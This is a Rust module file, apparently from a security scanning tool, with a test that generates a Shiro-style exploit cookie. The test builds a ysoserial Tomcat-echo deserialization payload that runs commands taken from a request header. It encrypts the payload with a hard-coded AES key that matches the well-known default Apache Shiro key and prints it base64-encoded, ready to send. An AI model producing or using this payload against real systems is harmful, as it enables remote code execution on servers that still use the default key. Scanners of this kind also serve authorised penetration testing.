pub mod dns_collect;
pub mod dns_handle;
pub mod file;
pub mod finger;
pub mod html;
pub mod nuclei;
pub mod plugin_export_func;
pub mod rsubdomain;
pub mod certificate;

mod test {
    use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
    use aes::Aes128;
    use base64::{engine::general_purpose, Engine};
    use std::error::Error;
    use uuid::Uuid;

    // AES-CBC 加密函数
    #[allow(dead_code)]
    fn aes_cbc_encrypt(data: &[u8], key_b64: &str) -> Result<Vec<u8>, Box<dyn Error>> {
        // Base64 解码密钥
        let key = general_purpose::STANDARD.decode(key_b64)?;

        // 生成随机 IV（AES 块大小为 16 字节）
        let iv = Uuid::new_v4().as_bytes()[..16].to_vec();

        // 准备密钥
        let key = GenericArray::clone_from_slice(&key[0..16]);
        let cipher = Aes128::new(&key);

        // 实现 PKCS7 填充
        let block_size = 16;
        let padding_len = block_size - (data.len() % block_size);
        let mut padded_data = data.to_vec();
        for _ in 0..padding_len {
            padded_data.push(padding_len as u8);
        }

        // 实现 CBC 模式加密
        let mut ciphertext = Vec::with_capacity(padded_data.len());
        let mut prev_block = GenericArray::clone_from_slice(&iv);

        for chunk in padded_data.chunks(16) {
            let mut block = GenericArray::clone_from_slice(chunk);
            // XOR with previous ciphertext block
            for i in 0..16 {
                block[i] ^= prev_block[i];
            }
            // Encrypt
            cipher.encrypt_block(&mut block);
            // Update previous block
            prev_block = block;
            // Add to result
            ciphertext.extend_from_slice(&block);
        }

        // 拼接 IV + ciphertext
        let mut result = iv.clone();
        result.extend_from_slice(&ciphertext);

        Ok(result)
    }

    #[test]
    fn test_get_tomcat_echo() {
        let payload = ysoserial_rs::get_cck2_tomcat_echo("X-Forwarded-For", "cmd");
        let encrypted = aes_cbc_encrypt(&payload, "kPH+bIxk5D2deZiIxcaaaA==").unwrap();
        let base64_payload = general_purpose::STANDARD.encode(&encrypted);
        println!("{}", base64_payload);
    }
}
